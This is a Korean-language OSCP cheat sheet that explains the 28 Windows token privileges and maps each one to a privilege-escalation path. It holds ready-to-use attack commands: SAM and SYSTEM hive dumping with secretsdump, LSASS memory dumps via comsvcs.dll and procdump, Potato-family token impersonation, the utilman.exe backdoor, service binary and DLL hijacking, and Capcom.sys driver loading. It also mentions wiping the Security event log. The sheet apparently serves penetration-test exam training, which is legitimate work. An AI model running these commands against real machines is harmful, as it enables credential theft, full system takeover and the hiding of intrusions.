# Windows 권한(Privilege) 28종 — OSCP 치트시트

쉘을 따고 나서 `whoami /priv` 결과를 해석하고, 권한이 보이면 어떻게 SYSTEM까지 가는지 정리.

# 기본 사용법

```bat
# 현재 토큰에 담긴 권한 확인 (윈도우 쉘 따면 무조건 첫 실행)
whoami /priv
# 그룹 멤버십 + 권한 전체 확인
whoami /all
```

# 해석 규칙 (중요)

- Se 접두사 = Security. 토큰(Token)에 담겨 프로세스에 부여되는 보안 권한이라는 뜻.
- State가 Disabled여도 쓸 수 있다.
  - 토큰에 권한이 "있으면" 프로세스가 스스로 활성화(AdjustTokenPrivileges) 가능.
  - Potato, mimikatz 같은 공격 도구는 활성화를 자동으로 처리. 고로 목록에 "보이면" 공격 대상.
- 목록에 아예 없으면 그 권한은 못 쓴다. 그룹에 안 붙었기 때문.
- 권한의 출처는 계정이 아니라 그룹/정책 (로컬 보안 정책 → 사용자 권한 할당). 그래서 권한 열거 = 그룹 멤버십 열거와 같은 맥락.
- 서비스 계정(LOCAL SERVICE, NETWORK SERVICE, IIS AppPool, MSSQL 등) 컨텍스트 쉘이면 SeImpersonate가 붙어있을 확률이 높다.

# OSCP 판정 요약

- 1티어 — 보이면 바로 공격:
  - 12. SeBackupPrivilege
  - 13. SeRestorePrivilege
  - 14. SeTakeOwnershipPrivilege
  - 15. SeDebugPrivilege
  - 16. SeImpersonatePrivilege
  - 25. SeManageVolumePrivilege
  - 27. SeLoadDriverPrivilege
- 2티어 — 조합/조건부:
  - 4. SeIncreaseQuotaPrivilege, 18. SeAssignPrimaryTokenPrivilege (토큰 세트)
  - 8. SeCreateGlobalPrivilege, 10. SeCreateSymbolicLinkPrivilege (체인 재료)
  - 23. SeShutdownPrivilege (재부팅 트리거용)
  - 26. SeSystemEnvironmentPrivilege, 28. SeTcbPrivilege
- 3티어 — whoami /priv에 보여도 무시: 1~3, 5~7, 9, 11, 17, 19~22, 24

# 전체 권한 목록 (28개)

## 메모리/리소스 그룹 (1~7) — 전부 무시 티어

### 1. SeLockMemoryPrivilege

- 뜻: 메모리 잠금 (Lock pages in memory)
- 직독직해: Se(시스템) + Lock(잠그다) + Memory(메모리) + Privilege(특권) → "메모리를 잠가 고정하는 특권"
- 핵심: AWE(Address Windowing Extensions)로 물리 메모리 페이지를 페이징 없이 고정하는 기능. 대용량 DB 성능 옵션이지 보안 경계가 아님.
- 판정: 무시. 권한상승 경로 없음.

### 2. SeCreatePagefilePrivilege

- 뜻: 페이지 파일 생성 (Create a pagefile)
- 직독직해: Create(생성하다) + Pagefile(페이지 파일) + Privilege → "페이지 파일을 만드는 특권"
- 핵심: pagefile.sys 생성/크기 변경. 변경은 재부팅 후 적용되고 공격 표면이 없음.
- 판정: 무시.

### 3. SeIncreaseWorkingSetPrivilege

- 뜻: 작업 집합 증가 (Increase a process working set)
- 직독직해: Increase(증가시키다) + Working Set(작업 집합) + Privilege → "프로세스의 물리 메모리 사용량을 늘리는 특권"
- 핵심: 프로세스 최소/최대 워킹셋(물리 RAM 점유량) 보증. 모든 사용자에게 기본 부여되는 성능 튜닝 권한.
- 판정: 무시. 기본 부여라 모든 쉘에 보이지만 아무 의미 없음.

### 4. SeIncreaseQuotaPrivilege

- 뜻: 쿼터 증가 (Increase scheduling priority / adjust memory quotas)
- 직독직해: Increase(증가시키다) + Quota(할당량) + Privilege → "프로세스에 더 큰 자원 할당량을 주는 특권"
- 핵심: 다른 프로세스의 메모리 쿼터를 늘려줌. 단독으론 아무것도 못 하지만, 18번 SeAssignPrimaryToken과 세트로 "다른 사용자 토큰으로 프로세스 띄우기" 체인의 보조 재료.
- 판정: 조건부. 서비스 계정 쉘에서 18번과 함께 보이면 토큰 계열 공격 가능 신호.

### 5. SeIncreaseBasePriorityPrivilege

- 뜻: 기본 우선순위 증가 (Increase scheduling priority)
- 직독직해: Increase(증가시키다) + Base(기본) + Priority(우선순위) + Privilege → "프로세스 스케줄링 우선순위를 올리는 특권"
- 핵심: SetPriorityClass로 Realtime 등 CPU 우선순위 상승. 성능/DoS 영역일 뿐 권한상승 불가.
- 판정: 무시.

### 6. SeSystemProfilePrivilege

- 뜻: 시스템 프로파일링 (Profile system performance)
- 직독직해: System(시스템) + Profile(성능을 분석하다) + Privilege → "시스템 전체 성능을 분석하는 특권"
- 핵심: 시스템 전체 샘플링 프로파일링. "메모리 내용 엿보기 가능" 논의는 있으나 실전 익스플로잇 없음.
- 판정: 무시.

### 7. SeProfileSingleProcessPrivilege

- 뜻: 단일 프로세스 프로파일링 (Profile single process)
- 직독직해: Profile(성능을 분석하다) + Single(단일) + Process(프로세스) + Privilege → "특정 프로세스 하나만 분석하는 특권"
- 핵심: 개별 프로세스 성능 카운터/샘플링. 6번의 축소판.
- 판정: 무시.

## 객체 생성 그룹 (8~11) — 대부분 체인 재료

### 8. SeCreateGlobalPrivilege

- 뜻: 전역 객체 생성 (Create global objects)
- 직독직해: Create(생성하다) + Global(전역의) + Privilege → "세션과 무관하게 보이는 전역 객체를 만드는 특권"
- 핵심: 네임드 객체(세마포어, 파이프 등)를 \\Global\ 네임스페이스에 생성. 관리자·서비스 그룹에 기본 부여라 서비스 계정 쉘에 자주 보임. 단독 EoP는 아니고, 네임드 파이프 협상이 필요한 다른 공격의 사전 조건 역할.
- 판정: 참고. 서비스 계정 쉘이면 이미 붙어있는 게 정상.

### 9. SeCreatePermanentPrivilege

- 뜻: 영구 객체 생성 (Create permanent shared objects)
- 직독직해: Create(생성하다) + Permanent(영구적인) + Privilege → "영구적으로 남는 커널 객체를 만드는 특권"
- 핵심: 참조가 없어도 살아있는 커널 객체 생성. 오브젝트 매니저/드라이버 개발용으로 시스템 전용 권한.
- 판정: 무시.

### 10. SeCreateSymbolicLinkPrivilege

- 뜻: 심볼릭 링크 생성 (Create symbolic links)
- 직독직해: Create(생성하다) + Symbolic Link(심볼릭 링크) + Privilege → "파일/디렉터리를 가리키는 링크를 만드는 특권"
- 핵심: NTFS 심볼릭 링크/마운트 포인트 생성 권한. 기본 부여 계정이 거의 없어(개발자 모드 켠 사용자 정도) 보이는 것 자체가 특이점. 단독 EoP는 아니고, 서비스의 파일 경로를 링크로 바꿔치기하는 Race Condition 체인의 재료.
- 판정: 조건부. 다른 취약점과 조합할 때만 의미.

### 11. SeChangeNotifyPrivilege

- 뜻: 변경 알림 우회 (Bypass traverse checking)
- 직독직해: Change(변경) + Notify(알리다) + Privilege → "디렉터리 변경 알림을 받는 특권" (실제 기능은 "경로 통과 검사 우회")
- 핵심: 폴더 나열 권한이 없어도 경로만 통과할 수 있게 해주는 권한. 모든 사용자 기본 부여.
- 판정: 무시. 모든 쉘에 보이는 기본값.

## 공격 골드라인 (12~18) — 여기서 점수가 나온다

### 12. SeBackupPrivilege

- 뜻: 백업 (Backup files and directories)
- 직독직해: Backup(백업하다) + Privilege → "백업 프로그램처럼 모든 파일을 읽는 특권"
- 핵심: 파일 ACL을 무시하고 시스템 전체 파일·레지스트리 "읽기" 가능. 관리자/Backup Operators 기본 부여. 소유자가 Administrator라 권한 없던 파일도 읽힘 → FLAG, SAM/SYSTEM, ntds.dit.

```bat
# ACL 무시하고 레지스트리 하이브 저장 (SAM 덤프의 정석)
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
# ACL 무시하고 파일 복사 (/b = 백업 모드)
robocopy /b C:\Users\Administrator\Desktop C:\temp secret.txt
```

```bash
# Kali에서 해시 추출
secretsdump.py -sam sam -system system LOCAL
```

- AD 환경이면 diskshadow로 볼륨 섀도 복사본 만들어 ntds.dit까지 같은 방식으로 읽음.
- 판정: 즉시 공격. Administrator Desktop 파일 회수 + 해시 덤프가 정석 시나리오.

### 13. SeRestorePrivilege

- 뜻: 복원 (Restore files and directories)
- 직독직해: Restore(복원하다) + Privilege → "백업 복원하듯 모든 파일에 쓰는 특권"
- 핵심: 파일 ACL을 무시하고 시스템 전체 "쓰기" + 파일 소유권 변경 가능. 백업이 읽기면 복원은 쓰기.
- 활용:
  - 서비스 실행 파일/DLL 교체 → 서비스 재시작 시 SYSTEM
  - 시스템 레지스트리 하이브 복원으로 설정 변조
  - 12번과 같이 보이는 경우가 많음(Backup Operators 그룹)

```bat
# 예: 서비스 바이너리 덮어쓰기 후 서비스 재시작
copy malicious.exe C:\Path\To\Service.exe
sc stop 취약서비스 && sc start 취약서비스
```

- 판정: 즉시 공격. 쓸 수 있는 자리에 있으면 SYSTEM 확정 경로.

### 14. SeTakeOwnershipPrivilege

- 뜻: 소유권 강탈 (Take ownership of files or other objects)
- 직독직해: Take(취하다) + Ownership(소유권) + Privilege → "소유자 동의 없이 소유권을 빼앗는 특권"
- 핵심: 모든 객체(파일, 레지스트리 키, 서비스)의 소유자로 자신을 지정 가능. 소유권만으론 권한이 안 생기므로 "소유권 획득 → 자신에게 ACL 부여 → 읽기/쓰기" 3단계로 씀.

```bat
# utilman.exe 접근성 버튼 공격 (로그온 화면에서 SYSTEM 쉘)
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Everyone:F
copy cmd.exe C:\Windows\System32\utilman.exe
# 로그온 화면 → 접근성 버튼 클릭 → SYSTEM cmd
# (트리거 재부팅이 필요하면 23번 SeShutdownPrivilege로 해결)
```

- 레지스트리 대상: SAM 키, 서비스 키의 소유권 탈취 → binPath 변조도 동일 원리.
- 판정: 즉시 공격.

### 15. SeDebugPrivilege

- 뜻: 디버그 (Debug programs)
- 직독직해: Debug(디버그하다) + Privilege → "모든 프로세스를 디버거처럼 다루는 특권"
- 핵심: SYSTEM 프로세스(lsass.exe 등)에 권한 제한 없이 OpenProcess 가능. 관리자 기본 부여. "관리자인데 SYSTEM이 아닌" 상태에서 권한을 프로세스 메모리 레벨로 끌어올리는 통로.

```powershell
# LSASS 덤프 (comsvcs.dll MiniDump, PID는 tasklist로 확인)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\out.dmp full
# procdump가 있으면 더 간단
procdump.exe -ma lsass.exe out.dmp
```

```bash
# Kali에서 크리덜 추출
pypykatz lsa minidump out.dmp
```

- Meterpreter면 load kiwi 후 creds_all (kiwi가 debug 권한 활성화까지 처리).
- 이미 SYSTEM이면 불필요. reverse 쉘로 lsass에 주입(migrate)하는 것도 같은 권한의 활용.
- 판정: 즉시 공격.

### 16. SeImpersonatePrivilege

- 뜻: 가장 (Impersonate a client after authentication)
- 직독직해: Impersonate(가장하다/사칭하다) + Privilege → "인증 후 다른 클라이언트로 가장하는 특권"
- 핵심: 받아온 토큰으로 다른 사용자를 가장해 프로세스 실행 가능. 관리자 + 모든 서비스 계정(LOCAL SERVICE, NETWORK SERVICE, IIS, MSSQL...)에 기본 부여. 웹쉘/서비스 컨텍스트 쉘에서 반드시 확인하는 1순위 권한.
- 원리: 이 권한 자체는 "토큰을 받아올 수 있다"가 아니라 "받아온 토큰을 쓸 수 있다". 그래서 SYSTEM이 인증하도록 유도(인증 강제, Coercion)하는 Potato 계열 공격과 세트.
- OS 버전별 도구 선택:

```bash
# Windows Server 2019 / Win10 1809+
PrintSpoofer.exe -i -c cmd
# Windows Server 2012 ~ 2022 폭넓게 (.NET 필요)
GodPotato -cmd "cmd /c whoami"
# Server 2008 / 2012 이하 구형
JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c whoami > C:\temp\o.txt" -t *
# 위 조합 전부 담은 올인원
SweetPotato.exe -a "whoami"
```

- Meterpreter: getprivs로 활성화 확인 후 incognito의 impersonate_token도 같은 권한 기반.
- 판정: 즉시 공격. OSCP 최빈출.

### 17. SeDelegateSessionUserImpersonatePrivilege

- 뜻: 세션 사용자 가장 위임 (Obtain an impersonation token for another user in the same session)
- 직독직해: Delegate(위임하다) + Session(세션) + User(사용자) + Impersonate(가장하다) + Privilege → "같은 세션의 사용자로 가장할 권한을 위임받는 특권"
- 핵심: 비교적 최근 추가된 권한. 같은 로그온 세션 내 다른 사용자 토큰 획득 허용. 기본 부여 계정이 사실상 없고 공개 익스플로잇도 희귀.
- 판정: 무시. 보이면 기록만.

### 18. SeAssignPrimaryTokenPrivilege

- 뜻: 기본 토큰 할당 (Replace a process level token)
- 직독직해: Assign(할당하다) + Primary(기본) + Token(토큰) + Privilege → "프로세스에 다른 기본 토큰을 끼워주는 특권"
- 핵심: CreateProcessAsUser로 다른 사용자의 기본(primary) 토큰을 단 프로세스 실행 가능. 16번이 "가장(impersonation) 토큰"이면 이건 "기본(primary) 토큰" 버전. 서비스 계정에 같이 기본 부여.
- 16번과 마찬가지로 "토큰을 훔치는" 권한이 아니라 "가진 토큰을 쓰는" 권한이라 Potato 도구들이 내부적으로 함께 활용.
- 판정: 조건부. 단독으론 토큰 소스가 없어 16번과 동일하게 Potato로 처리.

## 감사/시간/전원 그룹 (19~24) — EoP 불가

### 19. SeSecurityPrivilege

- 뜻: 보안 감사 관리 (Manage auditing and security log)
- 직독직해: Security(보안) + Privilege → "보안 로그와 감사 정책을 다루는 특권"
- 핵심: Security 이벤트 로그 열람/삭제, SACL 설정. 권한상승이 아니라 침투 후 흔적 지우기(wevtutil cl Security)용.
- 판정: 무시. EoP 아님, OSCP 점수와 무관.

### 20. SeAuditPrivilege

- 뜻: 감사 기록 생성 (Generate security audits)
- 직독직해: Audit(감사하다) + Privilege → "보안 감사 기록을 직접 생성하는 특권"
- 핵심: 프로세스가 보안 로그에 감사 항목을 쓸 수 있는 권한. 19번이 "보고 지우는" 권한이면 이건 "쓰는" 권한. 가짜 로그 위조용.
- 판정: 무시.

### 21. SeSystemtimePrivilege

- 뜻: 시스템 시간 변경 (Change the system time)
- 직독직해: System(시스템) + Time(시간) + Privilege → "시스템 시각을 바꾸는 특권"
- 핵심: 시각 변경. AD/Kerberos 환경에선 티켓 검증 장애(시간 오차) 유발 가능하지만 EoP는 아님.
- 판정: 무시.

### 22. SeTimeZonePrivilege

- 뜻: 표준시간대 변경 (Change the time zone)
- 직독직해: Time Zone(표준시간대) + Privilege → "시간대를 바꾸는 특권"
- 핵심: 모든 사용자 기본 부여. 실질 무해.
- 판정: 무시.

### 23. SeShutdownPrivilege

- 뜻: 시스템 종료 (Shut down the system)
- 직독직해: Shutdown(종료시키다) + Privilege → "시스템을 끄고 재시작하는 특권"
- 핵심: shutdown /r /t 0. 단독 EoP는 아니지만 다른 공격의 트리거 역할:
  - utilman.exe 교체처럼 "재부팅 후 적용되는" 공격의 마무리
  - 설치 기반 공격(AlwaysInstallElevated 등)의 재부팅 요구 충족
- 판정: 조합용. 원격 시스템 종료(RemoteShutdown)는 별개 정책.

### 24. SeUndockPrivilege

- 뜻: 도킹 해제 (Remove computer from docking station)
- 직독직해: Undock(도킹을 해제하다) + Privilege → "도킹 스테이션에서 분리하는 특권"
- 핵심: 물리 도킹/언도킹 제어. 서버·VM에서 존재 자체가 무의미.
- 판정: 무시.

## 볼륨/펌웨어/드라이버/TCB 그룹 (25~28) — 숨은 골드

### 25. SeManageVolumePrivilege

- 뜻: 볼륨 관리 (Perform volume maintenance tasks)
- 직독직해: Manage(관리하다) + Volume(볼륨) + Privilege → "디스크 볼륨을 관리하는 특권"
- 핵심: 디스크 조각모음·확장 같은 볼륨 유지보수 권한. 관리자 기본 부여가 아니라 정책에서 따로 준 경우에만 보임 → 보이는 순간 고평가.
- 공격 체인 (SeManageVolumeAbuse):

```bat
# 1. 볼륨 조작으로 C:\ 전체에 Full Control 획득
SeManageVolumeAbuse.exe
# 2. 스풀러가 로드하는 PrintConfig.dll 교체
copy PrintConfig.dll C:\Windows\System32\spool\drivers\
# 3. 스풀러 재시작 → DLL이 SYSTEM으로 로드
sc stop spooler && sc start spooler
```

- 판정: 즉시 공격. "C:\ 전체 쓰기"가 풀리므로 PrintConfig 외에도 시스템 파일 교체 경로 다수.

### 26. SeSystemEnvironmentPrivilege

- 뜻: 시스템 환경 (Modify firmware environment values)
- 직독직해: System(시스템) + Environment(환경) + Privilege → "펌웨어 환경 변수를 바꾸는 특권"
- 핵심: UEFI NVRAM 변수 쓰기 권한. 부팅 구성 변조, Secure Boot 관련 연구 재료. OS 레벨 EoP로 바로 가는 공개 경로는 희귀.
- 판정: 참고. 실전 OSCP에서 쓸 일 없음.

### 27. SeLoadDriverPrivilege

- 뜻: 드라이버 로드 (Load and unload device drivers)
- 직독직해: Load(적재하다) + Driver(드라이버) + Privilege → "커널 드라이버를 적재하는 특권"
- 핵심: 드라이버 = RING-0 코드. 이 권한이 있으면 커널까지 갈 수 있으나 서명된 드라이버만 로드 가능 → "서명돼 있는데 취약한" 드라이버가 필요.
- 공격 체인 (Capcom.sys):

```bash
# 1. 취약하지만 정식 서명된 Capcom.sys를 드라이버 서비스로 등록
# 2. EoPLoadDriver로 권한 활성화 + 로드
EoPLoadDriver System01 C:\temp\Capcom.sys
# 3. ExploitCapcom로 커널 임의 실행 → SYSTEM 쉘
ExploitCapcom.exe
```

- 판정: 즉시 공격(도구 준비 필요). Users 그룹에 이 권한이 부여된 비표준 설정이면 확정 경로.

### 28. SeTcbPrivilege

- 뜻: TCB 구성 (Act as part of the operating system)
- 직독직해: TCB(Trusted Computing Base, 신뢰할 수 있는 컴퓨팅 기반) + Privilege → "운영체제의 일부로서 행동하는 특권"
- 핵심: Windows 권한 체계의 정점. LsaLogonUser로 임의 사용자의 로그온 세션/토큰을 생성 가능 → 원하는 계정으로 "진짜 로그인한 것처럼" 행동. 기본 부여 계정 없음(SYSTEM이 암묵 보유). PSExec가 SYSTEM 서비스를 띄우는 원리.
- 판정: 이걸 토큰에서 발견하면 사실상 SYSTEM이니 굳이 도구가 필요 없는 영역.

# 빠른 의사결정 흐름

```bat
whoami /priv
```

- 16. SeImpersonate가 보인다 → OS 버전 확인(systeminfo) → PrintSpoofer / GodPotato / JuicyPotato
- 12. SeBackup이 보인다 → reg save로 SAM/SYSTEM → Kali에서 secretsdump
- 13. SeRestore가 보인다 → 서비스 바이너리/DLL 교체 자리 탐색 → 교체 후 서비스 재시작
- 14. SeTakeOwnership이 보인다 → utilman.exe 교체 → 로그온 화면 트리거
- 15. SeDebug가 보인다 → LSASS 덤프 → pypykatz/mimikatz로 크리덜
- 25. SeManageVolume이 보인다 → SeManageVolumeAbuse → PrintConfig.dll → 스풀러 재시작
- 27. SeLoadDriver가 보인다 → Capcom.sys + EoPLoadDriver + ExploitCapcom
- 4 + 18 세트가 보인다 → 16번과 동일하게 Potato 계열로 처리
- 이 외 전부 → 무시하고 다른 privesc 벡터(서비스 설정, AlwaysInstallElevated, 자동실행 등)로
